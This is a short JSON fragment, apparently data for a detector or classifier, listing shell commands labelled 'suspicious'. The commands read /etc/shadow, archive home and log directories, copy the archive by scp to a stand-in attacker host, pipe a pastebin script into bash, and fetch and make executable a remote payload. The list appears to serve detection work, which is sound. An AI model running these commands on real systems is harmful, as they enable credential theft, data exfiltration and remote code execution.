  "suspicious": [
    "sudo cat /etc/shadow",
    "sudo tar czf /tmp/exfil.tar.gz /var/log /home",
    "scp /tmp/exfil.tar.gz attacker@external.example.com:/share/",
    "curl -s https://pastebin.com/raw/abc123 | bash",
    "sudo find / -perm -4000 2>/dev/null",
    "wget http://10.50.99.42:8080/payload.sh -O /tmp/p.sh && chmod +x /tmp/p.sh",
